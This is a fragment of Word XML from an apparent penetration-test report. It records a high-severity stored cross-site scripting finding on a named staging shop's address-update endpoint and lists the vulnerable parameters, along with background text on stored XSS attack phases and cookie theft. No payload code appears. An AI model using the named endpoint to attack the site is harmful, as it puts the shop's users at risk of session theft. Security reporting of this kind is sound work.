        <w:t>HIGH RISK FINDINGS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C026C87" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidRPr="00CC4809" w:rsidSect="00CC4809">
          <w:footerReference w:type="default" r:id="rId21"/>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="540A3F20" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00B25F11" w:rsidRDefault="00CC4809" w:rsidP="00760616">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r w:rsidRPr="00B25F11">
        <w:t>Testing for Stored Cross Site Scripting(WSTG-INPV-02)</w:t>
      </w:r>
      <w:r w:rsidR="000316BB">
        <w:t/>
      </w:r>
      <w:r w:rsidRPr="00B25F11">
        <w:t/>
      </w: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395"/>
        <w:gridCol w:w="2695"/>
        <w:gridCol w:w="1868"/>
        <w:gridCol w:w="2369"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="1E84FC85" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="530"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2824956B" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY INFORMATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="34106AC4" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="350"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6ED83B34" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CATEGORY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="78641F44" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[High.Vuln.Category_Vuln]:unprocessed]</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="792CF048" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="74DCACCE" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>DESCRIPTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="50DE3F3D" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"Update address" function does not filter all of html tags and some javascript function, the attacker can abusing onmouseover function to steal user cookie or perform other attacks</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="57AB49B4" w14:textId="77777777" w:rsidTr="00CC4809">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4C0AF44A" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>SEVERITY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5B4A97B8" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="1A4CE4A5" w14:textId="77777777" w:rsidTr="00CC4809">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="613772C1" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>IMPACT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2695" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="273A3353" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1868" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7ECFCF7D" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>LIKELIHOOD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2369" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0557F489" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="4A7A5E6E" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="12EC3C40" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>RECOMMENDATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0BD02078" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="00491086" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="53857CB3" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>REFERENCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="430DB798" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Stored Cross-site Scripting (XSS) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack. This chapter illustrates examples of stored cross site scripting injection and related exploitation scenarios.</w:t>
              <w:br/>
              <w:t>Stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. As a consequence, the malicious data will appear to be part of the web site and run within the user’s browser under the privileges of the web application. Since this vulnerability typically involves at least two requests to the application, this may also called second-order XSS.</w:t>
              <w:br/>
              <w:t>This vulnerability can be used to conduct a number of browser-based attacks including:</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>Hijacking another user’s browser</w:t>
              <w:br/>
              <w:t>Capturing sensitive information viewed by application users</w:t>
              <w:br/>
              <w:t>Pseudo defacement of the application</w:t>
              <w:br/>
              <w:t>Port scanning of internal hosts (“internal” in relation to the users of the web application)</w:t>
              <w:br/>
              <w:t>Directed delivery of browser-based exploits</w:t>
              <w:br/>
              <w:t>Other malicious activities</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>Stored XSS does not need a malicious link to be exploited. A successful exploitation occurs when a user visits a page with a stored XSS. The following phases relate to a typical stored XSS attack scenario:</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>Attacker stores malicious code into the vulnerable page</w:t>
              <w:br/>
              <w:t>User authenticates in the application</w:t>
              <w:br/>
              <w:t>User visits vulnerable page</w:t>
              <w:br/>
              <w:t>Malicious code is executed by the user’s browser</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>This type of attack can also be exploited with browser exploitation frameworks such as BeEF and XSS Proxy. These frameworks allow for complex JavaScript exploit development.</w:t>
              <w:br/>
              <w:t>Stored XSS is particularly dangerous in application areas where users with high privileges have access. When the administrator visits the vulnerable page, the attack is automatically executed by their browser. This might expose sensitive information such as session authorization tokens.</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="6CC7F47D" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0E0B910A" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY DETAIL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="3E951BAC" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4DFB4F09" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>FUNCTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3D13E06A" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Update address</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="78E87F83" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7953752A" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>AFFECTED URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="11C2CABD" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>https://staging2.nguyenkimmall.com:443/index.php?dispatch=checkout.ajax_address</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="41F31B4A" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0A70B00A" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>PARAMETER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="201E3565" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>full_name, phone_number, street, address</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5BDC8297" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="266AB72F" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CONDITION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="67023C9F" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Authenticated User</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
